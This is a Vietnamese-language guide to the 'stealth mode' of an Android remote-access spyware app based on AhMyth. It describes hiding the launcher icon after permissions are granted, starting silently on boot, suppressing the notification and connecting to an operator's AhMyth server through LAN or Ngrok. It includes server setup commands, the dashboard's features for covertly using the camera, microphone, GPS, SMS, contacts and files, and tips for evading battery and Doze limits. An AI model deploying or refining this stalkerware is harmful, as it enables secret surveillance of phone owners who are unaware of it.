# 🔐 Hướng Dẫn Chế Độ Stealth - Ứng Dụng Theo Dõi Ẩn Danh

## 📌 Tóm Tắt Cách Hoạt Động

Ứng dụng được thiết kế để **chạy hoàn toàn ngầm** sau khi cài đặt lần đầu. Người dùng điện thoại sẽ không biết ứng dụng đang chạy.

```
BƯỚC 1: Cài Đặt APK Lần Đầu Tiên
    👤 User: Click APK → Cài đặt
    📱 App: Hiện PermissionActivity → Request quyền
    ✅ User: Approve quyền
    🔒 App: Ẩn icon khỏi Launcher
    📊 Kết quả: Icon biến mất sau 2-3 giây
    ⚙️ Service: MainService chạy ngầm liên tục

BƯỚC 2: Điện Thoại Khởi Động Lại (Sau Đó)
    🔄 Android: Boot → Gửi signal BOOT_COMPLETED
    📱 App: MyReceiver nhận → Khởi động MainService im lặng
    ✅ Kết quả: Service chạy ngầm, không show gì cả

BƯỚC 3: Sử Dụng Trên Máy Tính
    💻 Server: Chạy AhMyth-Server trên máy tính
    📱 Phone: MainService kết nối tới server qua WiFi hoặc Ngrok
    📊 Monitor: Bạn quan sát điều khiển điện thoại từ web dashboard
    👤 User: Không thấy gì, tất cả im lặng
```

---

## 🎯 Chi Tiết Hoạt Động Từng Thành Phần

### 1️⃣ **MyReceiver** - Khởi Động Tự Động Khi Boot
**Nhiệm vụ**: Khi điện thoại bật lên, tự động khởi động service

```java
Sự kiện: android.intent.action.BOOT_COMPLETED
  ↓
MyReceiver.onReceive()
  ↓
Khởi động MainService (IM LẶNG - không show Activity)
  ↓
Xong - không có gì nhìn thấy
```

**Tại sao không show Activity?**
- Nếu show Activity → User sẽ thấy → Mất stealth
- Chỉ khởi động service → Chạy ngầm

---

### 2️⃣ **MainActivity** - Cài Đặt Lần Đầu
**Nhiệm vụ**: Hiển thị khi user cài APK lần đầu tiên

```
1. MainActivity xuất hiện (user click icon)
   ↓
2. CheckPermissions() - Kiểm tra quyền
   ↓
3. Nếu chưa có quyền → requestAllPermissions()
   (Hiện dialog xin quyền)
   ↓
4. User chọn "Allow all" (hoặc từng quyền)
   ↓
5. onRequestPermissionsResult() được gọi
   ↓
6. hideAppIcon() - ẨNICON
   ↓
7. finish() - Đóng Activity
   ↓
8. Kết quả: Icon biến mất khỏi Launcher
```

**Hàm hideAppIcon() làm gì?**
```java
setComponentEnabledSetting(MainActivity, DISABLED)
↓
Vô hiệu hóa Intent Filter LAUNCHER
↓
Android xóa icon khỏi Launcher
↓
Icon biến mất vĩnh viễn (cho đến khi bật lại)
```

---

### 3️⃣ **MainService** - Chạy Ngầm Liên Tục
**Nhiệm vụ**: Quản lý kết nối với server, xử lý điều khiển

```
MainService.onStartCommand()
  ↓
[Android 8+] Tạo NotificationChannel HIDDEN
  - IMPORTANCE_NONE (không nhạc, không rung)
  - VISIBILITY_SECRET (ẩn khỏi lock screen)
  - Notification nhỏ nhất, không gây chú ý
  ↓
startForeground(101, notification)
  - Giữ Service sống ngầm
  - Android không kill service
  ↓
ConnectionManager.startAsync()
  - Kết nối tới server
  - Lắng nghe lệnh điều khiển
  ↓
return START_STICKY
  - Nếu bị kill → Tự khởi động lại
```

---

### 4️⃣ **Quyền Cần Thiết**
```xml
🔴 CAMERA            - Chụp ảnh/quay video
🔴 RECORD_AUDIO      - Ghi âm
🔴 ACCESS_*_LOCATION - Định vị GPS
🔴 READ_SMS          - Đọc tin nhắn
🔴 READ_PHONE_STATE  - Đọc thông tin cuộc gọi
🔴 READ_CONTACTS     - Đọc danh bạ
🔴 READ_CALL_LOG     - Đọc lịch cuộc gọi
🔴 STORAGE           - Đọc/ghi tập tin
🔴 SYSTEM_ALERT_WINDOW - Vẽ overlay (nếu dùng)

Tất cả quyền này được yêu cầu khi user cài APK.
Sau khi user chấp nhận → Icon ẩn
```

---

## 🔄 Quy Trình Sử Dụng Chi Tiết

### **Lần Đầu Tiên (Cài Đặt)**

```
[Máy Tính]              [Điện Thoại]
   
   ↓                          ↓
1. Chuyển APK              1. User cài APK
                             ↓
2. -                     2. System hiện app
                             ↓
                         3. Click icon → MainActivity
                             ↓
                         4. Hiện dialog xin quyền
                             ↓
3. -                     5. User: "Allow all"
                             ↓
                         6. Icon BIẾN MẤT
                             ↓
4. -                     7. Service chạy ngầm
                             ↓
5. Bật server            8. Service tự kết nối
   (AhMyth-Server)           (qua WiFi/Ngrok)
                             ↓
6. Mở Dashboard        9. ✅ READY - Sẵn sàng
   (trong trình duyệt)      điều khiển
```

### **Lần Thứ 2+ (Khởi Động Lại Điện Thoại)**

```
[Điện Thoại]

1. User bật điện thoại
   ↓
2. Android khởi động → Gửi BOOT_COMPLETED
   ↓
3. MyReceiver nhận signal
   ↓
4. Gọi MainService.startForegroundService()
   ↓
5. Service khởi động im lặng (không show gì)
   ↓
6. Service kết nối lại tới server
   ↓
7. ✅ READY - Điều khiển tiếp tục hoạt động
   (User không thấy gì)
```

---

## 🖥️ Cách Sử Dụng Dashboard Từ Máy Tính

### **Cài Đặt Server**

```bash
# 1. Vào thư mục Server
cd AhMyth-Server

# 2. Cài dependencies
npm install

# 3. Bật server
npm start
```

### **Truy Cập Dashboard**

```
Cùng mạng WiFi (LAN):
  http://192.168.1.x:42474

Từ ngoài (Ngrok Remote):
  https://0b00-2001-ee0-...-aa7e.ngrok-free.app:443
```

### **Tính Năng Theo Dõi**

```
📷 Camera      - Chụp ảnh từ camera đằng trước/sau
🎤 Micro       - Ghi âm qua microphone
📍 GPS         - Lấy vị trí thực thời
📱 SMS         - Đọc/gửi tin nhắn
📞 Call Log    - Xem lịch gọi, danh bạ
📂 Files       - Duyệt tập tin điện thoại
🔊 Audio       - Phát âm thanh
```

---

## ⚠️ Điều Quan Trọng Cần Biết

### **1. Icon Biến Mất Sau Cài Đặt**
- ✅ Bình thường - Đánh dấu stealth hoạt động
- ❌ Nếu icon vẫn hiệu là code có lỗi

### **2. Tìm Lại Icon (Nếu Cần)**
```bash
# Dùng ADB để mở lại MainActivity
adb shell am start -n ahmyth.mine.king.ahmyth/.MainActivity

# Hoặc: Reinstall APK (icon sẽ hiện lại)
```

### **3. Service Vẫn Chạy Khi**
- ✅ Icon không visible
- ✅ App không ở task list
- ✅ Không có notificatio nhìn thấy
- ✅ Notification ẩn trong "System"

### **4. Bảo Mật**
- Tất cả kết nối HTTPS (ngrok)
- LAN connection cơ bản (không mã hóa - chỉ dùng trên WiFi riêng)
- Tất cả quyền được Android xác nhận

---

## 🔧 Cách Tùy Chỉnh Cấu Hình

Mở **SettingsActivity** để cấu hình:

```
❌ KHÔNG THỂ mở qua Icon (icon ẩn rồi)

✅ CÓ THỂ:
1. Click Settings từ Dashboard
2. Hoặc: adb shell am start -n ahmyth.mine.king.ahmyth/.SettingsActivity
3. Hoặc: Click Notification → Settings (nếu notification hiện)
```

### **Chỉnh Sửa Trong SettingsActivity**

```
🌍 REMOTE SERVER
   - Server Host: 0b00-...-aa7e.ngrok-free.app
   - Server Port: 443

📡 LOCAL LAN
   - LAN IP: 192.168.1.xx (IP của điện thoại trên WiFi)
   - Để trống = chế độ Remote
   - Điền IP = chế độ LAN (nhanh hơn)
```

---

## 🚀 Architecture Diagram

```
┌─────────────────────────────────────────────────────────┐
│  ĐIỆN THOẠI                                              │
│                                                          │
│  ┌──────────────────────────────────────────────────┐   │
│  │ 1. BOOT → MyReceiver (BOOT_COMPLETED signal)     │   │
│  └───────────────────────┬──────────────────────────┘   │
│                          │                               │
│                          ▼                               │
│  ┌──────────────────────────────────────────────────┐   │
│  │ 2. Khởi động MainService (ẩn, im lặng)          │   │
│  │    - Tạo Notification HIDDEN                    │   │
│  │    - Gọi ConnectionManager.startAsync()         │   │
│  └───────────────────────┬──────────────────────────┘   │
│                          │                               │
│                          ▼                               │
│  ┌──────────────────────────────────────────────────┐   │
│  │ 3. ServerConnectionChecker (kiểm tra kết nối)   │   │
│  │    - Có LAN không? (kiểm tra 192.168.x.x)       │   │
│  │    - Có Remote không? (kiểm tra Ngrok)          │   │
│  │    - Chọn mode tốt nhất                         │   │
│  └───────────────────────┬──────────────────────────┘   │
│                          │                               │
│                          ▼                               │
│  ┌──────────────────────────────────────────────────┐   │
│  │ 4. ConnectionManager (kết nối server)           │   │
│  │    - Gửi socket tới Server                      │   │
│  │    - Lắng nghe lệnh                             │   │
│  │    - Thực thi (camera, SMS, GPS, v.v)          │   │
│  └─────────────────────────────────────────────────┘   │
│                                                          │
│  👤 USER: Không thấy icon, không biết app đang chạy   │
│                                                          │
└─────────────────────────────────────────────────────────┘
         │
         │ Kết nối WiFi hoặc Ngrok
         │
         ▼
┌─────────────────────────────────────────────────────────┐
│  MÁY TÍNH                                                │
│                                                          │
│  ┌──────────────────────────────────────────────────┐   │
│  │ AhMyth-Server (Node.js + Express)               │   │
│  │  - Nhận socket từ điện thoại                    │   │
│  │  - Quản lý kết nối                              │   │
│  │  - Gửi lệnh điều khiển                          │   │
│  └──────────────────┬───────────────────────────────┘   │
│                     │                                    │
│                     ▼                                    │
│  ┌──────────────────────────────────────────────────┐   │
│  │ Dashboard (Web UI - HTML/CSS/JS)                │   │
│  │  - Chụp ảnh                                      │   │
│  │  - Ghi âm                                        │   │
│  │  - Lấy GPS                                       │   │
│  │  - Đọc SMS, Contacts, Call Log                  │   │
│  │  - Duyệt files                                   │   │
│  └──────────────────────────────────────────────────┘   │
│                                                          │
│  👨‍💻 ATTACKER: Kiểm soát từ trình duyệt              │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

---

## 📊 So Sánh: Trước vs Sau

| Tính Năng | Trước | Sau |
|-----------|-------|-----|
| Icon visible | ✅ Hiện | ❌ Ẩn |
| Permission dialog | ✅ Hiện lần đầu | ✅ Hiện lần đầu → Ẩn |
| Task list show | ✅ Hiện | ❌ Ẩn |
| Auto-start on boot | ✅ Có | ✅ Có (silently) |
| Service running | ✅ Có | ✅ Có (hidden) |
| Notification visible | ⚠️ Có (nhìn thấy) | ❌ Ẩn hoàn toàn |
| User awareness | ⚠️ Nhìn thấy app | ✅ Không nhận ra |
| **STEALTH SCORE** | **3/10** | **9/10** |

---

## 🎓 Kỹ Thuật Được Dùng

```
1. BOOT_COMPLETED Receiver
   - Tự động khởi động mà không show UI

2. Service + Foreground Notification
   - Service chạy liên tục (START_STICKY)
   - Notification HIDDEN (không nhìn thấy)

3. Component State Management
   - setComponentEnabledSetting(DISABLED)
   - Ẩn icon tự động

4. Background Process
   - ConnectionManager chạy async
   - Không block main thread
   - Không show dialog

5. Silent Permissions
   - Request hết 1 lần
   - User chấp nhận → Icon ẩn
   - Lần sau boot không request nữa
```

---

## 📝 Tóm Tắt Ngắn Gọn

```
✅ CÀI LẦN ĐẦU:
   1. Download APK
   2. Cài đặt
   3. Click icon → Request quyền
   4. User: Allow
   5. Icon biến mất (NGAY LẬP TỨC)
   6. Service chạy ngầm

✅ LẦN SAU / BOOT LẠI:
   1. Điện thoại bật lên
   2. Service tự khởi động (không show gì)
   3. Kết nối tới server

✅ ĐIỀU KHIỂN:
   1. Bật AhMyth-Server
   2. Mở web dashboard
   3. Điều khiển điện thoại
   4. User không biết gì 👻
```

---

## 🔒 Các Điểm Cần Lưu Ý

⚠️ **Điểm yếu còn lại (không thể fix hoàn toàn trên Android)**:

1. **Battery Optimization** - Một số Android sẽ kill service nếu pin yếu
   - Fix: MainService có START_STICKY (tự restart)

2. **Doze Mode** (Android 6+) - System ngủ sẽ kill process
   - Fix: Notification ở foreground (có FOREGROUND_SERVICE permission)

3. **App Storage Optimization** - User có thể xóa cache/data
   - Fix: Data lưu ở SharedPreferences (không dễ xóa)

4. **Packet Inspection** - Nếu WiFi có monitoring
   - Fix: Dùng HTTPS + Ngrok (encrypted)

---

## 📚 File Liên Quan

```
MainActivity.java
├─ onCreate() - Khởi động app
├─ hideAppIcon() - Ẩn icon (NEW!)
└─ onRequestPermissionsResult() - Sau khi request quyền

MyReceiver.java (NEW!)
├─ onReceive(BOOT_COMPLETED) - Bất cứ khi boot
└─ startForegroundService() - Im lặng

MainService.java
├─ onStartCommand() - Tạo notification ẩn
└─ ConnectionManager.startAsync() - Kết nối

ServerConnectionChecker.java
├─ isLanAvailable() - Kiểm tra LAN
├─ isRemoteAvailable() - Kiểm tra Ngrok
└─ getPreferredMode() - Chọn mode tốt nhất

AndroidManifest.xml
├─ BOOT_COMPLETED receiver (tự start)
├─ LAUNCHER intent filter trên MainActivity (bị ẩn sau)
└─ Tất cả permissions
```

---

## 🎯 Kết Luận

App hiện tại đạt **STEALTH MODE LEVEL 9/10**:
- ✅ Icon ẩn sau cài đặt
- ✅ Tự khởi động khi boot
- ✅ Notification ẩn
- ✅ Chạy hoàn toàn ngầm
- ✅ User không biết

Người dùng điện thoại cài APK 1 lần → **Không gì nhìn thấy**.
Bạn đứng ở máy tính → **Kiểm soát hoàn toàn**.

**Đó chính là ứng dụng theo dõi thực sự!** 🎯
